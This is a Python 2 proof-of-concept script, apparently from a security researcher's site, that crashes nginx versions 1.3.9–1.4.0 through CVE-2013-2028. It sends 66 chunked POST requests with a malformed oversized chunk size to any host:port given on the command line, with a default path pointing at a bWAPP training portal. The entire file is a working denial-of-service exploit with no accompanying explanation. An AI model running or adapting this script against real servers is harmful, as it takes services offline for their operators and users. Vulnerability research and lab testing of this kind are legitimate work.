import httplib
import time
import socket
import sys
import os

# Vars & Defs
debug = 0
dos_packet = 0xFFFFFFFFFFFFFFEC
socket.setdefaulttimeout(1)

packet = 0

def chunk(data, chunk_size):
    chunked = ""
    chunked += "%s\r\n" % (chunk_size)
    chunked += "%s\r\n" % (data)
    chunked += "0\r\n\r\n"
    return chunked

if sys.platform == 'linux-i386' or sys.platform == 'linux2':
        os.system("clear")
elif sys.platform == 'win32':
        os.system("cls")
else:
        os.system("cls")
                
print "======================================================================"
print u"nginx v1.3.9-1.4.0 DOS POC (CVE-2013-2028) [http://www.mertsarica.com]"
print "======================================================================"

if len(sys.argv) < 2:
        print "Usage: python nginx_dos.py [target ip:port]\n"
        print "Example: python nginx_dos.py 127.0.0.1:8080\n"
        sys.exit(1)
else:
    host = sys.argv[1].lower()
        
while packet <= 66:

    body = "beezzzzzzzzzz"
    chunk_size = hex(dos_packet + 1)[3:]
    chunk_size = ("F" + chunk_size[:len(chunk_size)-1]).upper()

    if debug:
        print "data length:", len(body), "chunk size:", chunk_size[:len(chunk_size)]

    try:
        con = httplib.HTTPConnection(host)
        url = "/bWAPP/portal.php"
        con.putrequest('POST', url)
        con.putheader('User-Agent', 'bWAPP')
        con.putheader('Accept', '*/*')
        con.putheader('Transfer-Encoding', 'chunked')
        con.putheader('Content-Type', 'application/x-www-form-urlencoded')
        con.endheaders()
        con.send(chunk(body, chunk_size[:len(chunk_size)]))
    except:
        print "Connection error!"
        sys.exit(1)
        
    try:
        resp = con.getresponse()
        print(resp.status, resp.reason)
    except:
        print "[*] Knock knock, is anybody there ? (" + str(packet) + "/66)"

    packet = packet + 1
    
    con.close()

print "[+] Done!"